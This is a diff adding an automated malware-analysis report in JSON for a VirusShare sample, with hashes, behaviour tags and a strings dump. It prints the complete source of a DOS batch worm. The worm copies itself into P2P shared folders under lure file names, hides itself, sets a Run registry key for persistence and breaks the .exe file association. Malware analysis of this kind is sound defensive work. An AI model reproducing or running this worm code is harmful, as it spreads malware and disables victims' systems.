@@ -1,0 +1,86 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "Base64 Strings": "Base64-encoded str were detected, may be used to obfuscate str",
+            "Run": "May run an executable file or a system command",
+            "Windows": "May enumerate application windows"
+        },
+        "macro": "@echo off\nctty nul\nif not exist c:\\MyTask.bin goto 1\n:2\nif exist c:\\MyTask.tit goto 3\nset MyTask=.ex\nset MyTa=file\necho REGEDIT4>C:\\DeadExe.reg\necho.>>C:\\DeadExe.reg\necho [HKEY_CLASSES_ROOT\\%MyTask%e]>>C:\\DeadExe.reg\necho \"%1\" = \"txt%MyTa%\">>C:\\DeadExe.reg\necho \"Content Type\" = \"text/plain\">>C:\\DeadExe.reg\necho \"PerceivedType\" = \"text\">>C:\\DeadExe.reg\nregedit /s C:\\DeadExe.reg\ndel C:\\DeadExe.reg\ngoto 3\n:1\necho My Task is Dead >>c:\\MyTask.bin\necho Live a Little >>c:\\MyTask.tit\ncopy %0 c:\\MyTask.bat >nul\n@attrib +h +s c:\\MyTask.bat >nul\ncopy %0 c:\\progra~1\\kazaa\\myshar~1\\Task.exe.bat >nul\ncopy %0 c:\\progra~1\\bearshare\\shared\\HiT.mp3.bat >nul\ncopy %0 c:\\progra~1\\bearshare\\shared\\Game.exe.bat >nul\ncopy %0 c:\\progra~1\\eDonkey2000\\incoming\\Game.exe.bat >nul\ncopy %0 c:\\progra~1\\kazaa\\myshar~1\\Photo.jpg.bat >nul\ncopy %0 c:\\progra~1\\kazaa\\myshar~1\\Lesbian.jpg.bat >nul\ncopy %0 c:\\progra~1\\eDonkey2000\\incoming\\Lesbos.jpg.bat >nul\ncopy %0 c:\\progra~1\\bearshare\\shared\\Alizee.mp3.bat >nul\ncopy %0 c:\\progra~1\\eDonkey2000\\incoming\\install.exe.bat >nul\ncopy %0 c:\\progra~1\\kazaa\\myshar~1\\install.exe.bat >nul\ncopy %0 c:\\progra~1\\Uninstall.exe.bat >nul\necho REGEDIT4>C:\\My.reg\necho [HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run]>>C:\\My.reg\necho \"SysTask\"=\"c:\\\\MyTask.bat\" >> C:\\My.reg\nregedit /s C:\\My.reg\ndel C:\\My.reg >nul\ngoto 2\n:3\nctty con\ncls"
+    },
+    "filename": "VirusShare_112549b5961d661ba7cc931e4312cb68",
+    "filesize": 1404,
+    "filetype": "DOS batch file, ASCII text, with CRLF line terminators",
+    "hashes": {
+        "md5": "112549b5961d661ba7cc931e4312cb68",
+        "sha1": "9125cbe68f00c4172057eb96d845e4eea236e5bc",
+        "sha256": "57a76dc0b5e43c209cd02945d135e2122661e26d7826b3c1e3da3c03950faeda"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "@echo off",
+            "ctty nul",
+            "if not exist c:\\MyTask.bin goto 1",
+            "if exist c:\\MyTask.tit goto 3",
+            "set MyTask=.ex",
+            "set MyTa=file",
+            "echo REGEDIT4>C:\\DeadExe.reg",
+            "echo.>>C:\\DeadExe.reg",
+            "echo [HKEY_CLASSES_ROOT\\%MyTask%e]>>C:\\DeadExe.reg",
+            "echo \"%1\" = \"txt%MyTa%\">>C:\\DeadExe.reg",
+            "echo \"Content Type\" = \"text/plain\">>C:\\DeadExe.reg",
+            "echo \"PerceivedType\" = \"text\">>C:\\DeadExe.reg",
+            "regedit /s C:\\DeadExe.reg",
+            "del C:\\DeadExe.reg",
+            "goto 3",
+            "echo My Task is Dead >>c:\\MyTask.bin",
+            "echo Live a Little >>c:\\MyTask.tit",
+            "copy %0 c:\\MyTask.bat >nul",
+            "@attrib +h +s c:\\MyTask.bat >nul",
+            "copy %0 c:\\progra~1\\kazaa\\myshar~1\\Task.exe.bat >nul",
+            "copy %0 c:\\progra~1\\bearshare\\shared\\HiT.mp3.bat >nul",
+            "copy %0 c:\\progra~1\\bearshare\\shared\\Game.exe.bat >nul",
+            "copy %0 c:\\progra~1\\eDonkey2000\\incoming\\Game.exe.bat >nul",
+            "copy %0 c:\\progra~1\\kazaa\\myshar~1\\Photo.jpg.bat >nul",
+            "copy %0 c:\\progra~1\\kazaa\\myshar~1\\Lesbian.jpg.bat >nul",
+            "copy %0 c:\\progra~1\\eDonkey2000\\incoming\\Lesbos.jpg.bat >nul",
+            "copy %0 c:\\progra~1\\bearshare\\shared\\Alizee.mp3.bat >nul",
+            "copy %0 c:\\progra~1\\eDonkey2000\\incoming\\install.exe.bat >nul",
+            "copy %0 c:\\progra~1\\kazaa\\myshar~1\\install.exe.bat >nul",
+            "copy %0 c:\\progra~1\\Uninstall.exe.bat >nul",
+            "echo REGEDIT4>C:\\My.reg",
+            "echo [HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run]>>C:\\My.reg",
+            "echo \"SysTask\"=\"c:\\\\MyTask.bat\" >> C:\\My.reg",
+            "regedit /s C:\\My.reg",
+            "del C:\\My.reg >nul",
+            "goto 2",
+            "ctty con"
+        ],
+        "file": {
+            "del C:\\DeadExe.reg": "Registry",
+            "echo \"%1\" = \"txt%MyTa%\">>C:\\DeadExe.reg": "Registry",
+            "echo \"Content Type\" = \"text/plain\">>C:\\DeadExe.reg": "Registry",
+            "echo \"PerceivedType\" = \"text\">>C:\\DeadExe.reg": "Registry",
+            "echo \"SysTask\"=\"c:\\\\MyTask.bat\" >> C:\\My.reg": "Registry",
+            "echo My Task is Dead >>c:\\MyTask.bin": "Binary",
+            "echo REGEDIT4>C:\\DeadExe.reg": "Registry",
+            "echo REGEDIT4>C:\\My.reg": "Registry",
+            "echo [HKEY_CLASSES_ROOT\\%MyTask%e]>>C:\\DeadExe.reg": "Registry",
+            "echo [HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run]>>C:\\My.reg": "Registry",
+            "echo.>>C:\\DeadExe.reg": "Registry",
+            "regedit /s C:\\DeadExe.reg": "Registry",
+            "regedit /s C:\\My.reg": "Registry"
+        },
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.329794",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
